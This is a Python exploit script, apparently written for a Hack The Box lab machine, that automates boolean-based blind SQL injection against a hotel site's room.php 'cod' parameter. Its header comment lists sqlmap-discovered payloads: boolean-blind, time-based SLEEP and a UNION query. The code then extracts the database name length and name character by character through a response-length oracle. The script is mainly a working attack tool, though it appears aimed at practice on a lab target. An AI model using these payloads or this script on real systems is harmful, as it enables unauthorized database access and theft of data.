#!/usr/bin/env python3
# Type: boolean-based blind
#     Title: AND boolean-based blind - WHERE or HAVING clause
#     Payload: cod=1 AND 9966=9966

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: cod=1 AND (SELECT 8765 FROM (SELECT(SLEEP(5)))PvyL)

#     Type: UNION query
#     Title: Generic UNION query (NULL) - 7 columns
#     Payload: cod=-4739 UNION ALL SELECT NULL,NULL,CONCAT(0x7171706b71,0x574d78517658636276654d5752665262766c6a716d664e664c4b5370534757694a5968674d425868,0x7178716271),NULL,NULL,NULL,NULL-- -
# ---
# [23:14:01] [INFO] the back-end DBMS is MySQL
# web server operating system: Linux Debian 9 (stretch)
# web application technology: Apache 2.4.25
# back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
from os import name
from bs4.builder import HTML
import requests
from bs4 import BeautifulSoup

# 1782 for correct response
url = "http://supersecurehotel.htb/room.php?cod=1"
proxy = {
    'http':"http://127.0.0.1:8080"
}

def check(response):
    content_length = int(response.headers["Content-Length"])
    if (content_length > 1775):
        return True
    else:
        return False

def lengthOfDatabase():
    # Get length of the database name first.
    length = 1
    print("[*] Finding length of the database.")
    while True and length < 50:
        payload = url + " and length(database()) = " + str(length)
        print("Trying length: " + str(length), end="\r")
        res = requests.get(payload)
        if check(res):
            break
        length += 1

    if length == 50:
        print("[-] Database not found")
        exit(1)
    else:
        print("[+] Length of the database: ", length)
        return length

def enumerate_db_name(length):
    database_name = ""
    ascii = "abcdefghijklmnopqrstuvwxyz"
    for data_char in range(length):
        for char in ascii:
            payload = url + " and substring(database(),1," + str(len(database_name) + 1) + ") = " + "'" + database_name + char + "'"
            # print(payload)
            # break
            res = requests.get(payload)
            print("[*] Trying payload: ", payload, end="\r")
            if check(res):
                database_name += char
                # print("[+] Database Name: " + database_name)
                break
    if len(database_name) != 0:
        return database_name
    else:
        print("[-] Error Occured")
        exit(1)
# soup = BeautifulSoup(res.content, features="html.parser")
# print(soup.body)

def main():
    length = lengthOfDatabase()
    database_name = enumerate_db_name(length)



if __name__=='__main__':
    main()